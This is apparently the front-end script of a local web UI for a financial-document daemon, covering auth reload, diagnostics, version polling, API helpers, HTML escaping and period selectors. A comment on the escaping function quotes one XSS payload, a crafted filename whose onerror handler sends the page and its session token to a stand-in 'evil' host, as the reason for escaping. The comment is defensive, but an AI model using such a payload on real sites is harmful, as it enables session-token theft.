// TOKEN is set by the inline script in ui.html (which gets %%TOKEN%%
// substitution). ui.js runs after that script sets it on the global scope.
const H = { Authorization: "Bearer " + TOKEN };

// If the daemon restarts, the token changes and API calls return 401.
// Auto-reload the page to pick up the new token embedded in the HTML.
// With persisted sessions this should be rare; the guard prevents a
// reload storm if it ever fires repeatedly.
let authReloading = false;
function checkAuth(r) {
  if (r.status === 401 && !authReloading) {
    authReloading = true;
    setTimeout(() => location.reload(), 150);
  }
  return r;
}
const api = (p) => fetch(p, { headers: H }).then(checkAuth).then((r) => r.json());
// The folder watcher is the Drop folder — display it as such.
const sourceLabel = (s) => (s === "folder" ? "DROP" : s);

// ── error surfacing ──────────────────────────────────────────────
// Any uncaught error or rejected promise paints a red banner instead of a
// silent blank tab. This turns a user's browser into a diagnostic surface.
function showErrBanner(msg, src) {
  let b = document.getElementById("errBanner");
  if (!b) {
    b = document.createElement("div");
    b.id = "errBanner";
    b.style.cssText =
      "position:fixed;bottom:10px;left:10px;right:10px;z-index:99999;" +
      "background:#7f1d1d;color:#fff;font:11px/1.5 Menlo,monospace;" +
      "padding:10px 14px;border-radius:8px;white-space:pre-wrap;max-height:40vh;overflow:auto";
    document.body.appendChild(b);
  }
  b.textContent = "[" + src + "]\n" + msg;
}
window.addEventListener("error", (e) => {
  showErrBanner((e.error && e.error.stack) || e.message || "Unknown error", "uncaught error");
  diag({ kind: "error", msg: String((e.error && e.error.stack) || e.message || "Unknown error").slice(0, 500) });
});
window.addEventListener("unhandledrejection", (e) => {
  showErrBanner((e.reason && e.reason.stack) || String(e.reason), "unhandled rejection");
  diag({ kind: "rejection", msg: String((e.reason && e.reason.stack) || e.reason).slice(0, 500) });
});

// ── diagnostics: report browser state to the daemon (fire-and-forget) ──
function diag(extra) {
  try {
    let ls = {};
    try { ls = { tab: localStorage.getItem("q2av_tab"), period: localStorage.getItem("q2av_period") }; } catch { ls = {}; }
    fetch("/v1/diagnostics", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        ua: navigator.userAgent,
        vp: [window.innerWidth, window.innerHeight],
        href: location.href,
        tab: typeof activeTab !== "undefined" ? activeTab : null,
        loaders: typeof TAB_LOADERS !== "undefined" && TAB_LOADERS
          ? Object.keys(TAB_LOADERS).map((k) => k + ":" + typeof TAB_LOADERS[k])
          : [],
        ls,
        ...extra,
      }),
    }).catch(() => {});
  } catch { /* diagnostics must never break the page */ }
}
window.addEventListener("load", () => setTimeout(() => diag({ kind: "load" }), 1200));
document.addEventListener("click", (e) => {
  const b = e.target && e.target.closest && e.target.closest(".tabs button");
  if (!b) return;
  setTimeout(() => diag({ kind: "tab-click", target: b.dataset.tab }), 80);
});

// The daemon serves UI files live from disk. If they change under an open
// page (deploy, edit while browsing), reload once — the versioned asset
// URLs guarantee the whole set comes back fresh together. This closes the
// stale/mixed-cache class of "blank tab" bugs permanently.
setInterval(async () => {
  try {
    const h = await fetch("/v1/health", { headers: H }).then((r) => r.json());
    if (h && h.ui_version && UI_VERSION && String(h.ui_version) !== String(UI_VERSION)) {
      location.reload();
    }
  } catch {
    // daemon restarting — the next tick will sort it out
  }
}, 15000);

// Stamp the UI build in a fixed corner badge — confirms which code a
// browser actually runs (the footer gets repopulated by setFooter later).
try {
  const badge = document.createElement("div");
  badge.style.cssText =
    "position:fixed;bottom:8px;right:10px;z-index:9999;" +
    "font:10px Menlo,monospace;color:#999;opacity:.75;pointer-events:none";
  badge.textContent = "ui " + UI_VERSION;
  document.body.appendChild(badge);
} catch { /* ignore */ }
const apiPost = (p, body) => fetch(p, {
  method: "POST", headers: { ...H, "content-type": "application/json" },
  body: JSON.stringify(body || {}),
}).then(checkAuth).then((r) => r.json());
const apiPatch = (p, body) => fetch(p, {
  method: "PATCH", headers: { ...H, "content-type": "application/json" },
  body: JSON.stringify(body || {}),
}).then(checkAuth).then((r) => r.json());
const apiDelete = (p) => fetch(p, { method: "DELETE", headers: H }).then(checkAuth).then((r) => r.json());

const money = (m) => m === null || m === undefined ? "—"
  : "₹" + (m / 100).toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
const clock = () => new Date().toTimeString().slice(0, 8);
const ago = (iso) => {
  if (!iso) return "—";
  const s = Math.max(0, Math.round((Date.now() - Date.parse(iso)) / 1000));
  if (s < 60) return s + "s";
  if (s < 3600) return Math.round(s / 60) + "m";
  if (s < 86400) return Math.round(s / 3600) + "h";
  return Math.round(s / 86400) + "d";
};

/**
 * Escape API- and event-derived values before they reach an innerHTML sink.
 *
 * This is not theoretical: attachment filenames come from email headers, flow
 * through intake into `documents.original_filename`, and are rendered in the
 * transaction list, the evidence card, and the live feed. Anyone who can email
 * the vault address could otherwise name a file
 * `<img src=x onerror=fetch('//evil/'+document.body.innerHTML)>` and exfiltrate
 * the page — which, on this page, includes the API session token.
 *
 * Quotes are escaped too because several values land inside single-quoted
 * attributes (data-id, class), where &apos; alone would let an attacker close
 * the attribute.
 */
const esc = (v) => v === null || v === undefined ? "" : String(v)
  .replace(/&/g, "&amp;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;")
  .replace(/"/g, "&quot;")
  .replace(/'/g, "&#39;");

// ── tab navigation ───────────────────────────────────────────────
let activeTab = localStorage.getItem("q2av_tab") || "obs";

// ── period selector (shared by Dashboard and Documents Browser) ──
let selected = null;
let period = localStorage.getItem("q2av_period") || "this_fy";
const PERIODS = [
  { key: "this_month", label: "This Month" },
  { key: "last_month", label: "Last month" },
  { key: "this_fy", label: "This FY" },
  { key: "last_fy", label: "Last FY" },
  { key: "all", label: "All time" },
];
// A stale stored period (from an older build's vocabulary) would poison
// every data fetch with a value the API doesn't know. Migrate it.
if (!PERIODS.some((p) => p.key === period)) {
  period = "this_fy";
  try { localStorage.setItem("q2av_period", period); } catch { /* ignore */ }
}
function renderPeriods() {
  const el = document.getElementById("periods");
  el.innerHTML = PERIODS.map((p) =>
    "<button class='" + (p.key === period ? "on" : "") + "' data-p='" + esc(p.key) + "'>"
    + esc(p.label) + "</button>").join("");
  el.querySelectorAll("button").forEach((b) =>
    b.onclick = () => { period = b.dataset.p; localStorage.setItem("q2av_period", period); renderPeriods(); refreshObs(); });
  // Keep the Documents Browser period selector in sync — same shared state.
  const er = document.getElementById("periodsReview");
  if (er) renderPeriodsReview();
}

// Documents Browser shares the same period selector and localStorage key as
// the Dashboard, so changing it on one tab is reflected on the other.
function renderPeriodsReview() {
  const el = document.getElementById("periodsReview");
  if (!el) return;
  el.innerHTML = PERIODS.map((p) =>
    "<button class='" + (p.key === period ? "on" : "") + "' data-p='" + esc(p.key) + "'>"
    + esc(p.label) + "</button>").join("");
  el.querySelectorAll("button").forEach((b) =>
    b.onclick = () => { period = b.dataset.p; localStorage.setItem("q2av_period", period); renderPeriods(); renderPeriodsReview(); loadReview(); });
}
